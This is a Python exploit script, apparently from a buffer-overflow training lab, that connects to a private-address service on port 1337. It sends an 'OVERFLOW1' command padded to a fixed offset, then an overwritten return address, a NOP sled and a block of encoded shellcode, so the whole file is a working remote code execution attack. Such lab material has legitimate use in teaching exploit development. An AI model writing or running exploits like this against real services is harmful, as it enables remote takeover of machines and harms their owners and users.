#!/usr/bin/env python3

import socket


ip='10.10.172.138'
port=1337

shellcode =  ""
shellcode += "\x33\xc9\x83\xe9\xaa\xe8\xff\xff\xff\xff\xc0\x5e\x81"
shellcode += "\x76\x0e\xb1\xa9\xb6\x85\x83\xee\xfc\xe2\xf4\x4d\x41"
shellcode += "\x34\x85\xb1\xa9\xd6\x0c\x54\x98\x76\xe1\x3a\xf9\x86"
shellcode += "\x0e\xe3\xa5\x3d\xd7\xa5\x22\xc4\xad\xbe\x1e\xfc\xa3"
shellcode += "\x80\x56\x1a\xb9\xd0\xd5\xb4\xa9\x91\x68\x79\x88\xb0"
shellcode += "\x6e\x54\x77\xe3\xfe\x3d\xd7\xa1\x22\xfc\xb9\x3a\xe5"
shellcode += "\xa7\xfd\x52\xe1\xb7\x54\xe0\x22\xef\xa5\xb0\x7a\x3d"
shellcode += "\xcc\xa9\x4a\x8c\xcc\x3a\x9d\x3d\x84\x67\x98\x49\x29"
shellcode += "\x70\x66\xbb\x84\x76\x91\x56\xf0\x47\xaa\xcb\x7d\x8a"
shellcode += "\xd4\x92\xf0\x55\xf1\x3d\xdd\x95\xa8\x65\xe3\x3a\xa5"
shellcode += "\xfd\x0e\xe9\xb5\xb7\x56\x3a\xad\x3d\x84\x61\x20\xf2"
shellcode += "\xa1\x95\xf2\xed\xe4\xe8\xf3\xe7\x7a\x51\xf6\xe9\xdf"
shellcode += "\x3a\xbb\x5d\x08\xec\xc1\x85\xb7\xb1\xa9\xde\xf2\xc2"
shellcode += "\x9b\xe9\xd1\xd9\xe5\xc1\xa3\xb6\x20\x5e\x7a\x61\x11"
shellcode += "\x26\x84\xb1\xa9\x9f\x41\xe5\xf9\xde\xac\x31\xc2\xb6"
shellcode += "\x7a\x64\xc3\xbc\xed\xbb\xaf\xa5\x89\xd9\xab\xb6\xa6"
shellcode += "\x98\x20\x50\xd5\xe1\xf9\xe6\xc5\xe1\xe9\xe6\xed\x5b"
shellcode += "\xa6\x69\x65\x4e\x7c\x21\xef\xa1\xff\xe1\xed\x28\x0c"
shellcode += "\xc2\xe4\x4e\x7c\x33\x45\xc5\xa3\x49\xcb\xb9\xdc\x5a"
shellcode += "\x6d\xd6\xa9\xb6\x85\xdb\xa9\xdc\x81\xe7\xfe\xde\x87"
shellcode += "\x68\x61\xe9\x7a\x64\x2a\x4e\x85\xcf\x9f\x3d\xb3\xdb"
shellcode += "\xe9\xde\x85\xa1\xa9\xb6\xd3\xdb\xa9\xde\xdd\x15\xfa"
shellcode += "\x53\x7a\x64\x3a\xe5\xef\xb1\xff\xe5\xd2\xd9\xab\x6f"
shellcode += "\x4d\xee\x56\x63\x06\x49\xa9\xcb\xad\xe9\xc1\xb6\xc5"
shellcode += "\xb1\xa9\xdc\x85\xe1\xc1\xbd\xaa\xbe\x99\x49\x50\xe6"
shellcode += "\xc1\xc3\xeb\xfc\xc8\x49\x50\xef\xf7\x49\x89\x95\xa6"
shellcode += "\x33\xf5\x4e\x56\x49\x6c\x2a\x56\x49\x7a\xb0\x6a\x9f"
shellcode += "\x43\xc4\x68\x75\x3e\x41\x1c\x14\xd3\xdb\xa9\xe5\x7a"
shellcode += "\x64\xa9\xb6\x85"

Command = "OVERFLOW1 "
Offset = 1978*"A"
jmp = "\xD0\x0A\xAB\x77"
nops = 16*"\x90"

string = Command + Offset + jmp + nops + shellcode


try:
	with socket.socket() as s:
		s.connect((ip,port))
		print("sending  exploit")
		s.send(bytes(string,'latin-1'))
	
except:
	print("failed to connect")
